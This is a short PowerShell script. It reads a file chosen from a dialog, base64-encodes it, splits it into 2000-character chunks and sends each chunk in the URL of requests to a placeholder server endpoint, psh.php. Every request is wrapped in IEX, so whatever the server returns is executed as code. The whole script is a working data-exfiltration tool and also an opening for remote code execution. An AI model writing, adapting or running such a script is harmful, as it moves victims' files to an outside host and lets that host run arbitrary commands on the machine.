Function Get-FileName($initialDirectory)
{
    [System.Reflection.Assembly]::LoadWithPartialName("System.windows.forms") | Out-Null
    
    $OpenFileDialog = New-Object System.Windows.Forms.OpenFileDialog
    $OpenFileDialog.initialDirectory = $initialDirectory
    $OpenFileDialog.ShowDialog() | Out-Null
    $OpenFileDialog.filename
}

$ResultURL = "http://<url>/psh.php?y="                     # Destination URL
$inputfile = Get-FileName "C:\temp"                                    # Open dialog to select file to send
$FileContent = [IO.File]::ReadAllBytes($inputfile);                    # Read file
$encoded = [Convert]::ToBase64String($FileContent).TrimStart("`/"," ") # Convert to base64
#Write-Host ($ResultURL + $encoded)
[System.Collections.ArrayList]$split = @([regex]::split($encoded, '(.{2000})') -replace('\s+','`r`n'))    # Break into array each only 2000 character chunks (URL is limited to 2083 characters)
$newLine = $split | ? {$_}                                                                                
#Write-Host $newLine[4]

#for ($counter = 0; $counter -lt $newLine.Count; $counter++) {Write-Host ($ResultURL +$newLine[$counter] + "&name=Test.txt")}           
for ($counter = 0; $counter -lt $newLine.Count; $counter++) {IEX(New-Object System.Net.WebClient).DownloadString($ResultURL + $newLine[$counter] + "&name=test.txt")}    # Append each array entry to URL and send
